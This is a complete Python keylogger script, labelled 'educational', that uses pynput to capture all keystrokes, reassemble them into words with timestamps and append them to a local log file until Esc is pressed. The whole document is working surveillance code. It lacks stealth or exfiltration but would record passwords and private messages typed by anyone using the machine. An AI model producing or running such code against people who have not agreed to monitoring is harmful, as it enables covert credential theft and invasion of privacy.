"""Educational keylogger: logs complete words with a timestamp.

Words are closed on Space, Enter or Tab. Everything still in memory is
flushed when the listener stops (Esc) so no keystrokes are lost.
"""

from datetime import datetime

from pynput.keyboard import Key, Listener

LOG_FILE = "log.txt"
MAX_LINES = 10  # finished lines kept in memory before writing to disk

lines = []      # finished lines waiting to be written to disk
word = []       # characters of the word currently being typed
word_time = None  # timestamp of the first character of that word
shift = False   # whether Shift is currently held


def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def write_file():
    """Append every buffered line to disk and empty the buffer."""
    global lines
    if not lines:
        return
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    lines = []


def flush_word():
    """Close the word in progress, turning it into a timestamped line."""
    global word, word_time
    if word:
        lines.append("{} | {}".format(word_time, "".join(word)))
        word = []
        word_time = None
    if len(lines) >= MAX_LINES:
        write_file()


def flush_all():
    """Flush the pending word and everything buffered in memory."""
    flush_word()
    write_file()


def on_press(key):
    global shift, word_time

    if key in (Key.shift, Key.shift_l, Key.shift_r):
        shift = True
        return

    if key == Key.backspace:
        if word:
            word.pop()
        return

    if key in (Key.space, Key.enter, Key.tab):
        flush_word()
        return

    char = getattr(key, "char", None)
    if not char:
        return  # named keys (Ctrl, Alt, arrows, ...) are ignored

    if shift and char.isalpha() and char.islower():
        char = char.upper()

    if not word:
        word_time = now()
    word.append(char)


def on_release(key):
    global shift

    if key in (Key.shift, Key.shift_l, Key.shift_r):
        shift = False

    if key == Key.esc:
        flush_all()
        return False


if __name__ == "__main__":
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    finally:
        flush_all()
